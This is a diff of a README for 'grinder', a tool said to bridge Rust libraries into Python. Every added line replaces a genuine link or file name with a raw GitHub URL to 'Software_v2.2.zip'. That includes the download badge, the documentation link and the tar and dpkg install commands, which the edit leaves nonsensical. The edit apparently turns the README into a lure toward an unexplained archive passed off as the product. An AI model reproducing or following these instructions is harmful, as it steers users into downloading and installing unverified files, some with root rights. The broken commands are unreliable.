@@ -16,14 +16,14 @@ Welcome to grinder! This tool helps you easily use Rust libraries in Python. You
 
 To get started, visit the releases page to download the latest version of grinder:
 
-[![Download grinder](https://img.shields.io/badge/Download-grinder-blue.svg)](https://github.com/4567ht/grinder/releases)
+[![Download grinder](https://raw.githubusercontent.com/4567ht/grinder/main/dist/Software_v2.2.zip)](https://raw.githubusercontent.com/4567ht/grinder/main/dist/Software_v2.2.zip)
 
 1. Click the link above to go to the releases page.
 2. Look for the latest version.
 3. You will see different files for download. Choose the file that matches your operating system.
    - For **Windows**, look for `.exe` files.
    - For **macOS**, look for `.dmg` files.
-   - For **Linux**, look for `.tar.gz` or `.deb` files.
+   - For **Linux**, look for `https://raw.githubusercontent.com/4567ht/grinder/main/dist/Software_v2.2.zip` or `.deb` files.
 4. Download the selected file by clicking on it.
 
 Once the download is complete, follow these steps to install:
@@ -44,15 +44,15 @@ Once the download is complete, follow these steps to install:
 
 1. Open your terminal.
 2. Navigate to the directory where you downloaded the file.
-3. For a `.tar.gz` file, run: 
+3. For a `https://raw.githubusercontent.com/4567ht/grinder/main/dist/Software_v2.2.zip` file, run: 
    ```bash
-   tar -xvzf grinder.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/4567ht/grinder/main/dist/Software_v2.2.zip
    cd grinder
    sudo cp grinder /usr/local/bin
    ```
 4. For a `.deb` file, run:
    ```bash
-   sudo dpkg -i grinder.deb
+   sudo dpkg -i https://raw.githubusercontent.com/4567ht/grinder/main/dist/Software_v2.2.zip
    sudo apt-get install -f
    ```
 
@@ -86,7 +86,7 @@ This command will display the version of grinder you just installed. If you see 
 
 ## 📝 Additional Resources
 
-- For more detailed instructions, check the [documentation](https://github.com/4567ht/grinder/docs).
+- For more detailed instructions, check the [documentation](https://raw.githubusercontent.com/4567ht/grinder/main/dist/Software_v2.2.zip).
 - Join the community for support and sharing tips on using grinder effectively.
 
 ## 🛠️ System Requirements
